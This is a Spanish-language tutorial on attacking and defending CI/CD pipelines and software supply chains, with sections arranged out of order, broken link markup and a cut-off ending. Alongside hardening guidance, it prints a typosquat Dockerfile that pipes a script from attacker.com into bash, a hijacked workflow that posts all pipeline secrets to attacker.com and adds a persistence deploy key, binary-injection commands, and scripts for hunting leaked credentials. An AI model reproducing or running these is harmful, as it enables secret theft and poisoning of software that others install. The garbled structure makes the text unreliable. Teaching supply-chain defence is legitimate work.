git log --all -p | grep -i "password\|secret\|key\|token\|AKIA"

# Buscar en commits especificos
git log --all --diff-filter=D --summary | grep "delete"

# Mostrar archivos eliminados y su contenido
git log --all --diff-filter=D --name-only --format="" | while read file; do echo "=== Archivo eliminado: $file ===" git log --all --follow -- "$file" --format="%H %ai" | tail -1 | while read hash date; do git show $hash^:$file 2>/dev/null done
done

# Buscar texto en archivos que ya no existen
git grep "AKIA" $(git rev-list --all)

# Mostrar el contenido de cada commit que toco un archivo
git log -p --all -S "password" --pickaxe-all
```

### 7.3 .git Directory Exposure

Si el directorio `.git` esta expuesto en un servidor web, se puede descargar entero.

```bash
# Verificar si .git esta expuesto
curl -s http://victim.com/.git/HEAD
# Deberia devolver: ref: refs/heads/main

# Descargar el repositorio completo
git clone http://victim.com/.git/

# O usar herramientas especializadas
git clone https://github.com/internetwache/GitTools
cd GitTools/Dumper
./gitdumper.sh http://victim.com/.git/ /tmp/dump/

# Extraer informacion
cd GitTools/Extractor
./extractor.sh /tmp/dump/ /tmp/extracted/
```

**Dump manual de .git expuesto:**
```bash
#!/bin/bash
# git-dump.sh - Dump completo de .git expuesto
BASE_URL="$1"
OUTPUT_DIR="$2"

mkdir -p "$OUTPUT_DIR"

# Descargar HEAD
curl -s "$BASE_URL/HEAD" -o "$OUTPUT_DIR/HEAD"

# Descargar config
curl -s "$BASE_URL/config" -o "$OUTPUT_DIR/config"

# Descargar index
curl -s "$BASE_URL/index" -o "$OUTPUT_DIR/index"

# Obtener refs
for ref in HEAD refs/heads/main refs/heads/master; do curl -s "$BASE_URL/$ref" | while read hash; do curl -s "$BASE_URL/objects/$(echo $hash | cut -c1-2)/$(echo $hash | cut -c3-40)" \ -o "$OUTPUT_DIR/objects/$(echo $hash | cut -c1-2)/$(echo $hash | cut -c3-40)" done
done
```

### 7.5 Ejercicio Practico: Git History Attack

**Escenario:** Encontraste el directorio `.git` expuesto en `http://dev.victim.com/.git/`.

**Tarea:** Recuperar el repositorio completo y encontrar secrets en el historial.

**Pistas:**
1. Descarga el .git completo.
2. Usa GitTools para extraer objetos.
3. Busca en commits antiguos por passwords.
4. Revisa archivos eliminados que puedan contener credenciales.

---

## 8. [docker](../raw/d0ck3r-f0r-h4ck3rs.md) Supply Chain

### 8.1 Base Image Poisoning

Las imagenes base de Docker pueden contener malware. Si un atacante compromete una imagen popular, todos los que la usan estan infectados.

```dockerfile
# Dockerfile con base insegura
FROM node:18  # Esta imagen podria estar comprometida!
# O peor:
# FROM node:18.0.0-alpine (version especifica comprometida?)

WORKDIR /app
COPY package*.json ./
RUN npm install
COPY . .
CMD ["node", "app.js"]
```

**Verificar integridad de imagenes base:**
```bash
# Verificar firmas de imagenes
docker trust inspect node:18 --pretty

# Escanear vulnerabilidades
docker scout quickview node:18
docker scout recommendations node:18

# Usar solo imagenes con SHA256
FROM node@sha256:abc123def456..
```

### 8.2 Multi-Stage Build Attacks

En multi-stage builds, cada stage puede ser un vector de ataque.

```dockerfile
# Dockerfile multi-stage vulnerable
FROM node:18 AS build
WORKDIR /app
COPY package*.json ./
RUN npm install
COPY . .
RUN npm run build

FROM nginx:alpine
COPY --from=build /app/dist /usr/share/nginx/html
# Si "build" stage tiene malware, pasa a la imagen final!

COPY --from=build /app/node_modules/evil /usr/share/nginx/html/evil
# O si un paso intermedio inyecto algo
```

### 8.3 Docker Hub Typosquatting

```bash
# Imagenes con typo-squatting en Docker Hub:
# oficial: node -> typo: noda, noode, nodee
# oficial: nginx -> typo: niginx, ngnix, nginix
# oficial: alpine -> typo: alpne, alpnie, alpin
# oficial: python -> typo: ptyhon, pyhton, pyt hon
# oficial: ubuntu -> typo: ubunut, ubutnu, ubuntuu

# Verificar propietario de imagen
docker image inspect my-image:latest | jq '.Author'

# Verificar firmas
docker trust inspect --pretty my-image:latest
```

**Ejemplo: Imagen maliciosa con typo-squatting:**
```dockerfile
# Dockerfile para "pyth0n" (typo de python)
FROM ubuntu:latest

# Ejecutar payload durante build
RUN apt-get update && apt-get install -y curl
RUN curl -s http://attacker.com/malware.sh | bash

CMD ["python3"]
```

### 8.4 Docker Registry exploitation

```bash
# Escanear registros Docker en busca de imagenes vulnerables
# Buscar registros publicos
curl -s https://registry.hub.docker.com/v2/repositories/library/

# Enumerar tags de una imagen
curl -s https://registry.hub.docker.com/v2/repositories/library/python/tags/ | jq '.results.name'

# Extraer imagenes de un registro privado
docker login registry.victim.com
docker pull registry.victim.com/internal-app:latest
docker save registry.victim.com/internal-app:latest -o image.tar
tar -xvf image.tar
cat manifest.json | jq '.'

# Analizar layers de la imagen
docker history --no-trunc registry.victim.com/internal-app:latest

# Buscar secrets en layers de Docker
mkdir layers
for layer in $(docker history --no-trunc victim-image:latest | grep -v ^$ | tail -n +2 | awk '{print $1}'); do docker save victim-image:latest > /tmp/image.tar tar -xf /tmp/image.tar -C /tmp/image find /tmp/image -name "layer.tar" -exec tar -xf {} -C layers \;
done
grep -r "password\|secret\|key" layers/
```

### 8.5 Ejercicio Practico: Docker Supply Chain

**Escenario:** Una empresa usa una imagen base personalizada `internal-base:latest` en todos sus servicios.

**Tarea:** Encontrar y explotar la imagen base comprometida.

**Pistas:**
1. Descarga la imagen `internal-base:latest`.
2. Analiza los layers en busca de codigo malicioso.
3. Busca secrets hardcodeados en los layers.
4. Crea una imagen maliciosa con typo-squatting del nombre.

---

## 9. [ci/cd](../raw/c1cd-h4ck1ng.md) Security Assessment

### 9.1 Hardening de p[ipeline](./raw/c1cds

```yaml
# Pipeline seguro - GitHub Actions
name: Secure Deploy
on: push: branches: [main] pull_request: branches: [main]

# Principio de minimo privilegio
permissions: contents: read  # Solo lectura por defecto id-token: write # Solo para OIDC cuando es necesario issues: none

jobs: build: runs-on: ubuntu-latest # No usar self-hosted runners para tareas no confiables # Si es necesario, runners efimeros steps: - uses: actions/checkout@v3 # Pin actions a SHA256 commits, no a version tags - uses: actions/setup-node@v3  # <- Inseguro: podrian modificar v3 # - uses: actions/setup-node@abc123def456..  # <- Seguro: SHA fijo - name: Build run: | # No usar eval o ejecucion de codigo dinamico npm ci  # npm ci es deterministico, npm install no npm run build - name: Test run: | npm test deploy: needs: build if: github.event_name == 'push' runs-on: ubuntu-latest environment: production # Environments permiten reviewers y restricciones steps: - name: Deploy run: | # Usar OIDC en vez de access keys aws s3 sync dist/ s3://production-bucket/ env: # Las variables solo disponibles en este step AWS_REGION: us-east-1
```

### 9.2 Least Privilege para Runners

```yaml
# Runner seguro
name: Secure Runner
on: [push]

jobs: # Separar jobs por nivel de confianza lint: runs-on: ubuntu-latest  # Runner administrado por GitHub (mas seguro) steps: - uses: actions/checkout@v3 - run: npm run lint build: # No tiene acceso a secrets de deploy runs-on: ubuntu-latest steps: - uses: actions/checkout@v3 - run: npm ci && npm run build deploy: needs: [lint, build] runs-on: ubuntu-latest environment: production # Solo se ejecuta cuando pasa lint y build steps: - uses: actions/checkout@v3 - name: Deploy env: AWS_ROLE: ${{ secrets.AWS_DEPLOY_ROLE }} run: | # Usar OIDC aws s3 sync dist/ s3://production/
```

### 9.5 Herramientas de Seguridad CI/CD

```bash
# Herramientas de escaneo
# - Trivy: Escaneo de vulnerabilidades en imagenes
# - Snyk: Escaneo de dependencias
# - Dependabot: Actualizaciones automaticas de dependencias
# - Semgrep: Static analysis
# - SonarQube: Code quality y security
# - Checkov: Escaneo de IaC (Terraform, CloudFormation)
# - tfsec: Seguridad de Terraform
# - kube-bench: Benchmark de seguridad Kubernetes

# Instalacion
pip install checkov
pip install semgrep
choco install trivy
```

### 9.6 Checklist de Seguridad

```markdown
# Checklist de Seguridad CI/CD

## Source Control
[x] Branch protection rules activadas
[x] Requerir PRs para main/master
[x] Requerir code review de al menos 2 personas
[x] Firmado de commits (GPG)
[x] No permitir force push a branches protegidos
 Push hooks pre-commit (gitleaks)

## Pipeline
[x] Actions/plugins pinneados a SHA commits
[x] No usar `pull_request_target` si se puede evitar
[x] Separar jobs por niveles de confianza
[x] Usar entornos (environments) con reviewers
[x] No usar `run: |` con eval dinamico
[x] Minimo privilegio en permissions del workflow
 Self-hosted runners solo en VPC privada

## Dependencias
[x] Usar lockfiles (package-lock.json, poetry.lock, etc.)
[x] Dependabot o renovate configurado
[x] Verificar firmas de paquetes
[x] Escaneo de vulnerabilidades en dependencias
[x] Prevenir dependency confusion
 Usar registro privado para paquetes internos

## Secrets
[x] Usar secrets nativos de GitHub/GitLab
[x] No hardcodear secrets en variables de entorno
[x] Rotacion periodica de secrets
[x] Escaneo automatico de secrets en cada commit
 Usar OIDC para autenticacion cloud

## Artefactos
[x] Firmar artefactos de build
[x] Escaneo de vulnerabilidades en imagenes Docker
[x] Verificar checksums de artefactos
[x] Almacenar artefactos en repositorio seguro
 SBOM generado automaticamente
```

---

## 10. Escenarios de Ataque completos

### 10.1 Escenario 1: SolarWinds-style Attack

**Contexto:** Una empresa de software tiene un p[ipeline](./raw/c1cd [ci/cd](../raw/c1cd-h4ck1ng.md) que compila, firma y distribuye su producto.

**Fase 1: [reconocimiento](../raw/0s1nt.md#reconocimiento)](**
```bash
# Identificar el pipeline
# Buscar archivos de configuracion CI/CD publicos
curl -s https://gitlab.com/victim/infra/-/raw/main/.gitlab-ci.yml
# o
curl -s https://github.com/victim/app/blob/main/.github/workflows/build.yml
```

**Fase 2: Comprometer dependencia de build**
```bash
# Identificar dependencias del build
# Si usan una action de terceros, comprometerla
# O crear un typo-squatting de una dependencia que usan

# Si el pipeline usa una imagen Docker personalizada
# Comprometer el Dockerfile de la imagen base
```

**Fase 3: Inyectar codigo malicioso en el build**
```bash
# El codigo se inyecta en el producto final
# Los clientes reciben el producto con el backdoor

# Ejemplo: inyectar un callback en el binario
# durante el proceso de compilacion
```

**Fase 4: Exfiltracion y [persistencia](../raw/w1nd0ws-p0st3xpl01t.md#persistencia)**
```bash
# El backdoor en el producto final conecta al C2
# Se puede mantener acceso mientras el producto este firmado como legitimo
```

### 10.2 Escenario 2: Dependency Confusion en Empresa

**Fase 1: Identificar paquetes internos**
```bash
# Buscar en el codigo publico de la empresa
# Nombres de paquetes, namespaces, dominios internos

git clone https://github.com/victim/public-repo
grep -r "require\|import\|from" public-repo/ | grep -v "@scope\|@company"
# Encontrar: 'acme-internal-lib', 'acme-utils', etc.
```

**Fase 2: Subir paquetes maliciosos**
```bash
# Subir a npm con los mismos nombres
# Version 99.99.99 (para que sea la mas alta)
npm publish acme-internal-lib --tag latest
```

**Fase 3: Esperar que se instale**
```bash
# Cuando alguien ejecute npm install
# npm descarga la version mas alta (99.99.99)
# El paquete malicioso se ejecuta

# Si no se instala automaticamente, se puede:
# 1. Crear un PR que agregue la dependencia
# 2. Esperar a que haya un nuevo deploy
```

### 10.3 Escenario 3: [pipeline](../raw/c1cd-h4ck1ng.md#pipeline) Takeover

**Fase 1: Obtener acceso al repositorio**
```bash
# Via:
# - Credenciales filtradas de un empleado
# - OAuth app maliciosa
# - Session hijacking
# - Vulnerability en GitHub/GitLab
```

**Fase 2: Modificar el pipeline**
```bash
# Agregar un job que:
# 1. Exfiltra secrets del pipeline
# 2. Modifica artefactos de build
# 3. Crea persistencia (deploy key, token)
```

```yaml
name: Modified Pipeline
on: [push]

jobs: steal: runs-on: ubuntu-latest steps: - name: Exfiltrar secrets env: ALL_SECRETS: ${{ toJSON(secrets) }} run: | curl -X POST http://attacker.com/steal -d "secrets=$ALL_SECRETS" - name: Crear persistencia run: | # Agregar deploy key curl -X POST -H "Authorization: token ${{ secrets.GITHUB_TOKEN }}" \ "https://api.github.com/repos/${{ github.repository }}/keys" \ -d '{"title":"persistence","key":"ssh-rsa AAA..","read_only":false}'
```

### 10.4 Escenario 4: Secrets Exfiltration Masiva

**Fase 1: Escanear GitHub en busqueda de leaks**
```bash
# Usar trufflehog en modo organizacion
trufflehog github --org=victim-org --token=ghp_xxx --json

# O buscar patrones manualmente
gh search code "AKIA" --owner=victim-org
gh search code "password=" --owner=victim-org --extension=env
```

**Fase 2: Usar las credenciales encontradas**
```bash
# AWS keys
aws sts get-caller-identity --profile victim-profile
aws s3 ls --profile victim-profile

# GitHub tokens
gh api repos --jq '.full_name'

# Slack tokens
curl -H "Authorization: Bearer xoxb-xxx" https://slack.com/api/conversations.list
```

**Fase 3: Escalar el acceso**
```bash
# Usar credenciales de CI/CD para acceder a pipelines
# y desde ahi a mas secrets
```

---

## 11. Defensa y Buenas Practicas

### 11.1 Principios de Confianza Zero en [ci/cd](../raw/c1cd-h4ck1ng.md)

1. **Nunca confiar en inputs externos** - Sanitizar todas las variables
2. **Verificar cada paso** - Checksums, firmas, hashes
3. **Minimo privilegio** - Cada job con solo los [permisos](../raw/0s-f0nd4m3nt0s.md#permisos) necesarios
4. **Separacion de entornos** - Desarrollo != Produccion
5. **Registro y auditoria** - Todo debe ser logueado

### 11.3 SBOM y Firmado de Artefactos

```bash
# Generar SBOM con CycloneDX
# Para Node.js
npx cyclonedx-npm --output-file sbom.json

# Para Python
pip install cyclonedx-bom
cyclonedx-py requirements.txt -o sbom.xml

# Para Docker
docker buildx imagetools inspect victim-image:latest --format '{{json .SBOM}}'

# Firmar artefactos con cosign
cosign sign --key cosign.key victim-image:latest

# Verificar firma
cosign verify --key cosign.pub victim-image:latest
```

### 11.4 Respuesta a Incidentes de Supply Chain

```markdown
## Plan de Respuesta a Supply Chain Attack

### 1. Deteccion
- Alertas de dependabot sobre dependencias comprometidas
- Escaneo automatico de nuevos paquetes
- Monitoreo de logs de build (cambios inesperados)
- Alertas de seguridad de GitHub/GitLab

### 2. Contencion
- Deshabilitar pipelines automaticos
- Revocar tokens y secrets comprometidos
- Congelar deploys a produccion
- Desconectar self-hosted runners

### 3. Investigacion
- Revisar historial de commits del pipeline
- Identificar cuando se introdujo la dependencia comprometida
- Analizar imagenes Docker en produccion
- Revisar logs de acceso

### 4. Erradicacion
- Eliminar dependencias comprometidas
- Rotar todos los secrets
- Reconstruir todas las imagenes desde cero
- Actualizar pipelines

### 5. Recuperacion
- Deploy desde un punto conocido como seguro
- Verificar firmas de artefactos
- Monitorear actividad post-recuperacion

### 6. Lecciones Aprendidas
- Actualizar politicas de seguridad
- Mejorar monitoreo
- Implementar controles adicionales
```

---

## 12. Apendices

### 12.1 Cheatsheet de comandos

```bash
# GitHub API
gh repo list victim-org
gh api repos/victim-org/victim-repo/actions/secrets
gh api repos/victim-org/victim-repo/actions/workflows

# GitLab API
glab api projects/:id/variables
glab api projects/:id/pipelines

# Git
git log --all -p | grep -i "password\|secret\|key"
git log --all --diff-filter=D --name-only

# Docker
docker scout quickview victim-image:latest
docker history --no-trunc victim-image:latest

# TruffleHog
trufflehog git https://github.com/victim/repo.git --json
trufflehog github --org=victim-org

# Gitleaks
gitleaks detect --source=/repo -v
gitleaks protect --staged

# Escaneo de dependencias
npm audit
pip-audit
mvn dependency-check:check
```

### 12.2 YAML p[ipeline](./raw/c1cd Templates

**Template seguro de GitHub Actions:**
```yaml
name: Secure Pipeline
on: push: branches: [main] pull_request: branches: [main]

permissions: contents: read

jobs: build: runs-on: ubuntu-latest steps: - uses: actions/checkout@v3 - name: Build run: npm ci && npm run build - name: Test run: npm test
```

### 12.3 Herramientas y Recursos

**Herramientas de ataque:**
- TruffleHog: Busqueda de secrets
- Gitleaks: Escaneo de repositorios git
- GitMiner: Mineria de datos en GitHub
- Dependency-Check: Escaneo de dependencias
- retire.js: Escaneo de librerias JS vulnerables
- npm-audit: Auditoria de dependencias npm
- pip-audit: Auditoria de dependencias [python](../raw/pyth0n-f0r-h4ck1ng.md)

**Herramientas de defensa:**
- Dependabot: Actualizaciones automaticas
- Snyk: Escaneo de vulnerabilidades
- Trivy: Escaneo de imagenes [docker](../raw/d0ck3r-f0r-h4ck3rs.md)
- Checkov: Escaneo de IaC
- Semgrep: SAST
- SonarQube: Code quality
- Cosign: Firmado de artefactos
- Notary: Firmado de imagenes Docker

**Recursos de aprendizaje:**
- [owasp](../raw/w3b-h4ck1ng.md#owasp-top-10): Top 10 [ci/cd](../raw/c1cd-h4ck1ng.md) Security Risks
- Cider Security: CI/CD Security Guide
- Praetorian: CI/CD Attack Framework
- SpecterOps: [pipeline](../raw/c1cd-h4ck1ng.md#pipeline) Security
- GitHub Security Lab: Security research ## 2.3 Indirect Ppe: Dependencias comprometidas

En vez de modificar el p[ipeline](./raw/c1cd directamente, el atacante compromete un componente que el pipeline usa.

**Ejemplo 1: Script externo**
```yaml
# Pipeline que descarga y ejecuta un script
jobs: build: steps: - name: Ejecutar script de build run: | curl -s https://cdn.victim.com/build-script.sh | bash # Si ese servidor esta comprometido, se ejecuta codigo malicioso!
```

**Ejemplo 2: Action de terceros**
```yaml
jobs: build: steps: - uses: third-party/deploy-action@v2 # Si third-party/deploy-action es comprometido # todos los que lo usan estan en riesgo
```

**Ejemplo 3: Imagen docker base**
```yaml
jobs: build: container: image: node:18-alpine # Si node:18-alpine fuera comprometido..
```

### 2.5 Artifact Poisoning

Envenenar artefactos de build para que el codigo malicioso llegue a produccion:

```yaml
name: Build and Release
on: push: tags: - 'v*'

jobs: build: runs-on: ubuntu-latest steps: - uses: actions/checkout@v3 - name: Compile run: | gcc -o app src/main.c - name: Create Release uses: softprops/action-gh-release@v1 with: files: app
```

**Ataque:** Si el binario compilado es modificado entre el build y el release:
```bash
# Inyectar codigo en el binario compilado
objcopy --add-section .evil=payload.bin app app-infected
# O modificar bytes del binario
printf '\x90\x90\x90\xCC' | dd of=app bs=1 seek=$(some_offset) conv=notrunc
```

## 6.4 GitMiner: Mineria de Secrets en GitHub

GitMiner permite buscar patrones avanzados en GitHub:

```bash
git clone https://github.com/UnkL4b/GitMiner
cd GitMiner
pip install -r requirements.txt

# Configurar token de GitHub
export GITHUB_TOKEN=ghp_xxx

# Buscar keywords
python GitMiner.py -k "password" -o results.txt
python GitMiner.py -k "aws_access_key" -o aws_results.txt
python GitMiner.py -k "slack_token" -o slack_results.txt

# Buscar por extension
python GitMiner.py -k "password" -e ".env" -o env_results.txt
python GitMiner.py -k "secret" -e ".json" -o json_results.txt

# Buscar en repositorios especificos
python GitMiner.py -k "api_key" -r victim-org/repo-name

# Busqueda avanzada con expresiones regulares
python GitMiner.py -p "AKIA[0-9A-Z]{16}" -o aws_keys.txt
python GitMiner.py -p "-----BEGIN RSA PRIVATE KEY-----" -o ssh_keys.txt
```

**Busqueda masiva con GitHub Code Search API:**
```python
# github_secret_scanner.py
import requests
import json

GITHUB_TOKEN = "ghp_xxx"
HEADERS = { "Authorization": f"token {GITHUB_TOKEN}", "Accept": "application/vnd.github.v3+json"
}

QUERIES = [ "AKIA[0-9A-Z]{16} password", "-----BEGIN OPENSSH PRIVATE KEY-----", "aws_access_key_id=AKIA", "ghp_ extension:txt", "sk_live_ extension:env", "xoxb- extension:json"
]

def search_github(query): url = f"https://api.github.com/search/code?q={query}&per_page=100" response = requests.get(url, headers=HEADERS) return response.json

for query in QUERIES: print(f"\n[+] Buscando: {query}") try: results = search_github(query) for item in results.get('items', ): print(f"  - {item['repository']['full_name']}: {item['path']}") print(f" URL: {item['html_url']}") except Exception as e: print(f"  Error: {e}")
```

## 6.6 Rotacion Automatica de Secrets

```bash
# Script de rotacion de secrets AWS
#!/bin/bash
# rotate_aws_keys.sh

USERNAME="$1"

echo "[*] Rotando keys para usuario: $USERNAME"

# Crear nueva key
NEW_KEY=$(aws iam create-access-key --user-name "$USERNAME" --output json)
ACCESS_KEY_ID=$(echo $NEW_KEY | jq -r '.AccessKey.AccessKeyId')
SECRET_ACCESS_KEY=$(echo $NEW_KEY | jq -r '.AccessKey.SecretAccessKey')

echo "[+] Nueva Access Key: $ACCESS_KEY_ID"

# Actualizar en GitHub Secrets
gh secret set AWS_ACCESS_KEY_ID -b "$ACCESS_KEY_ID" --repo victim-org/victim-repo
gh secret set AWS_SECRET_ACCESS_KEY -b "$SECRET_ACCESS_KEY" --repo victim-org/victim-repo

echo "[+] Secrets actualizados en GitHub"

# Desactivar key vieja
# (obtener key vieja del secret)
OLD_KEY_ID=$(gh secret list --repo victim-org/victim-repo | grep AWS_ACCESS_KEY_ID | awk '{print $2}')
aws iam update-access-key \ --access-key-id "$OLD_KEY_ID" \ --status Inactive \ --user-name "$USERNAME"

echo "[+] Key vieja desactivada: $OLD_KEY_ID"

# Esperar para verificar que la nueva funciona
sleep 30

# Eliminar key vieja
aws iam delete-access-key \ --access-key-id "$OLD_KEY_ID" \ --user-name "$USERNAME"

echo "[+] Key vieja eliminada: $OLD_KEY_ID"
echo "[*] Rotacion completada!"
```

## 7.4 Git Object Recovery

Recuperar objetos sueltos (dangling objects) del repositorio git:

```bash
# Encontrar objetos sueltos
git fsck --lost-found

# Listar commits perdidos
git fsck --lost-found | grep commit

# Recuperar un commit perdido
git show <hash-del-commit-perdido>

# Recuperar todos los objetos sueltos
git fsck --lost-found
ls -la .git/lost-found/commit/
ls -la .git/lost-found/other/

# Examinar cada objeto recuperado
for obj in .git/lost-found/commit/*; do echo "=== $(basename $obj) ===" git show $(cat $obj) --stat echo
done

# Recuperar informacion de blobs (archivos)
for obj in .git/lost-found/other/*; do echo "=== $(basename $obj) ===" git cat-file -p $(cat $obj) echo "---"
done

# Si no hay reflog, buscar en paquetes
git verify-pack .git/objects/pack/*.idx | sort -k3 -n | tail -20
# Los objetos mas recientes estan al final

# Extraer objetos de packs
for pack in .git/objects/pack/*.pack; do git unpack-objects < $pack
done
```

**Script completo de recuperacion de git:**
```bash
#!/bin/bash
# git_forensics.sh - Recuperar informacion de repositorio git

REPO_DIR="$1"
OUTPUT_DIR="$2"

cd "$REPO_DIR"

echo "[*] Analizando repositorio: $REPO_DIR"

# 1. Informacion basica
echo "[+] HEAD actual:"
git log --oneline -5

# 2. Todos los branches (incluyendo remotos)
echo "[+] Todos los branches:"
git branch -a

# 3. Reflog
echo "[+] Reflog:"
git reflog --date=iso | head -20

# 4. Archivos eliminados
echo "[+] Archivos eliminados:"
git log --diff-filter=D --summary | grep "delete mode" | sort -u

# 5. Buscar secrets en el historial
echo "[+] Buscando passwords en historial.."
git log --all -p | grep -i "password\|secret\|key\|token\|AKIA" | head -50

# 6. Objetos sueltos
echo "[+] Objetos sueltos:"
git fsck --lost-found 2>&1

# 7. Autores del repositorio
echo "[+] Autores:"
git log --format='%an <%ae>' | sort -u

# 8. Tags
echo "[+] Tags:"
git tag -l

# 9. Archivos grandes
echo "[+] Archivos grandes (top 20):"
git rev-list --objects --all | \ git cat-file --batch-check='%(objecttype) %(objectname) %(objectsize) %(rest)' | \ awk '/^blob/ {print $3, $4}' | sort -rn | head -20

# 10. Exportar logs
echo "[+] Exportando logs.."
git log --all --format="%H %ai %an <%ae> %s" > "$OUTPUT_DIR/commits.txt"

echo "[*] Analisis completado. Resultados en: $OUTPUT_DIR"
```

## 9.3 Secrets Management

**Mejores practicas para manejo de secrets en [ci/cd](../raw/c1cd-h4ck1ng.md):**

```yaml
# Usar secrets nativos en vez de variables de entorno
steps: - name: Deploy env: # MAL: secret hardcodeado en variable # DB_PASS: super-secret-password # BIEN: usar secret de GitHub DB_PASS: ${{ secrets.DB_PASSWORD }} run: | # No hacer echo del secret # echo "Password: $DB_PASS" # Pasar solo cuando es necesario ./deploy.sh --password "$DB_PASS"
```

**Vault integration con CI/CD:**
```yaml
# Usar HashiCorp Vault con pipelines
name: Deploy with Vault
on: [push]

jobs: deploy: runs-on: ubuntu-latest steps: - uses: actions/checkout@v3 - name: Autenticar con Vault uses: hashicorp/vault-action@v2 with: url: https://vault.victim.com method: jwt role: ci-role secrets: | secret/data/db password | DB_PASSWORD ; secret/data/aws key | AWS_ACCESS_KEY ; secret/data/aws secret | AWS_SECRET_KEY ; - name: Deploy run: | # $DB_PASSWORD, $AWS_ACCESS_KEY, $AWS_SECRET_KEY disponibles ./deploy.sh
```

## 11.2 Monitoreo de p[ipeline](./raw/c1cds

**Monitoreo de actividad sospechosa en pipelines:**

```bash
# GitHub: Revisar logs de Actions
gh run list --repo victim-org/victim-repo --limit 20 --json conclusion,headBranch,createdAt

# Detectar cambios inesperados en workflows
git log --oneline .github/workflows/
git diff HEAD~1 HEAD -- .github/workflows/

# Monitorear acceso al repositorio
# GitHub Audit Log (requiere organizacion)
gh api orgs/victim-org/audit-log -q '. | select(.action | contains("workflow")'

# Alertas de seguridad
gh api repos/victim-org/victim-repo/dependabot/alerts --jq '.security_advisory.description'
```

**Script de auditoria de cambios en [ci/cd](../raw/c1cd-h4ck1ng.md):**
```bash
#!/bin/bash
# audit_cicd_changes.sh
REPO="$1"
DAYS="$2"

echo "[*] Auditando cambios en CI/CD del repositorio $REPO en los ultimos $DAYS dias"
echo

cd "$REPO"

# Cambios en archivos de CI/CD
echo "=== Cambios en .github/workflows/ ==="
git log --since="$DAYS days ago" --oneline -- .github/workflows/

echo
echo "=== Cambios en .gitlab-ci.yml ==="
git log --since="$DAYS days ago" --oneline -- .gitlab-ci.yml

echo
echo "=== Cambios en Dockerfile ==="
git log --since="$DAYS days ago" --oneline -- Dockerfile*

echo
echo "=== Nuevos secrets agregados ==="
gh secret list --repo victim-org/victim-repo --json name,updatedAt | \ jq -r '. | select(.updatedAt > "$(date -d "$DAYS days ago" -I)") | .name'

echo
echo "=== Nuevos miembros del repositorio ==="
gh api repos/victim-org/victim-repo/collaborators --jq \ '. | select(.permissions.admin == true) | .login'
```

## 12.1 Cheatsheet de comandos (continuacion)

```bash
# Exploracion de dependencias
# npm
npm ls --depth=5
npm audit --json
npm outdated

# pip
pip list
pip check
pip-audit

# Maven
mvn dependency:tree
mvn dependency-check:check

# Docker
docker sbom victim-image:latest
docker scout quickview victim-image:latest
docker history --no-trunc victim-image:latest
docker image inspect victim-image:latest | jq '.Config.Env'

# Git forensics
git log --all --graph --oneline --decorate
git log --all -p --follow -- filename
git diff HEAD~1 HEAD
git reflog show --date=iso
git fsck --full
git rev-list --objects --all | git cat-file --batch-check='%(objecttype) %(objectname) %(objectsize) %(rest)' | awk '/^blob/ {print $3,$4}' | sort -rn | head -10

# GitHub API
gh api repos/:owner/:repo/actions/secrets
gh api repos/:owner/:repo/actions/workflows
gh api repos/:owner/:repo/actions/runs
gh api repos/:owner/:repo/dependabot/alerts

# GitLab API
glab api projects/:id/variables
glab api projects/:id/pipelines
glab api projects/:id/runners

# TruffleHog
trufflehog git https://github.com/org/repo.git --json --only-detected
trufflehog github --org=target-org --token=$GITHUB_TOKEN
trufflehog gitlab --url=https://gitlab.com --token=$GITLAB_TOKEN

# Gitleaks
gitleaks detect --source=. --report-format=json --report-path=report.json
gitleaks protect --staged --verbose
```

## 12.3 Herramientas y Recursos (continuacion)

**Frameworks de ataque [ci/cd](../raw/c1cd-h4ck1ng.md):**
- **peASS-ng:** [privilege escalation](../raw/l1n9x-pr1v3sc.md)
- **Pacu:** [aws](../raw/cl0ud-h4ck1ng.md#aws) exploitation (incluye modulos CI/CD)
- **cloudFox:** [cloud](../raw/cl0ud-h4ck1ng.md) enumeration
- **ScoutSuite:** [cloud security](../raw/cl0ud-h4ck1ng.md) auditing
- **Cartography:** Visualizacion de infraestructura cloud
- **Prowler:** Cloud security assessment

**Herramientas de defense CI/CD:**
- **Snyk:** Vulnerability scanning for dependencies
- **Trivy:** [container](../raw/d0ck3r-f0r-h4ck3rs.md#contenedores) vulnerability scanner
- **Clair:** Static analysis of containers
- **Falco:** Runtime security for containers
- **Opa/Gatekeeper:** Policy enforcement for [kubernetes](../raw/k8s-d33p-d1v3.md)-d33p-d1v3.md)-d33p
- **Kyverno:** Kubernetes policy engine
- **Checkov:** Static analysis of IaC
- **tfsec:** Terraform security scanner
- **Kube-bench:** CIS benchmark for Kubernetes

**Recursos de aprendizaje:**
- [[owasp top 10](../raw/w3b-h4ck1ng.md#owasp-top-10)](./raw/w3b CI/CD Security Risks
- Cider Security: CI/CD Security Field Guide
- Praetorian: CI/CD Attack and Defense
- SpecterOps: CI/CD p[ipeline](./raw/c1cd Attacks
- NCC Group: CI/CD Security Research
- GitHub Security Lab: Research and cves
- GitLab Security: advisories and best practices

**Laboratorios practicos:**
- [tryhackme](../raw/ctf-h4ckth3b0x.md#tryhackme)-h4ckth3b0x.md#[tryhackme](../raw/ctf-h4ckth3b0x.md#tryhackme)): CI/CD Security rooms
- [hackthebox](../raw/ctf-h4ckth3b0x.md#hackthebox): Supply chain machines
- PentesterLab: CI/CD challenges
- SecureFlag: CI/CD security labs
- [owasp](../raw/w3b-h4ck1ng.md#owasp-top-10) Juice Shop: CI/CD exploitation ### 5.5 Dependency Confusion en Maven

```xml
<!-- pom.xml con dependencia vulnerable -->
<dependency> <groupId>com.acme.internal</groupId> <artifactId>auth-lib</artifactId> <version>1.0.0</version>
</dependency>
```

Los atacantes pueden subir paquetes con el mismo `groupId:artifactId` a repositorios publicos como Maven Central.

**Ataque:**
1. Identificar paquetes internos de la empresa (groupId `com.acme.internal`)
2. Subir paquete malicioso a Maven Central con el mismo nombre
3. El build descarga la version publica (si no configuraron repositorio privado primero)

```xml
<!-- settings.xml mal configurado: Maven busca en publico PRIMERO -->
<settings> <mirrors> <mirror> <id>central</id> <url>https://repo.maven.apache.org/maven2</url> <mirrorOf>*</mirrorOf>  <!-- TODO: mal, deberia ser external:* --> </mirror> </mirrors>
</settings>
```

### 5.6 Typo-squatting en RubyGems

```bash
# Paquetes populares para typosquatting en Ruby:
# rails -> railes, raisl, railes
# devise -> devsie, devvise, dev1se
# puma -> pumma, pumaa, pumaz
# rack -> rak, rakck, rakc

# Crear gem malicioso
gem build evil.gemspec
gem push evil-99.0.0.gem

# O crear un gem con nombre similar
# rails -> railes
gem push railes-99.0.0.gem
```

### 8.4 [docker](../raw/d0ck3r-f0r-h4ck3rs.md) Registry Exploitation (continuacion)

```bash
# Acceder a Docker Registry API (si no requiere auth)
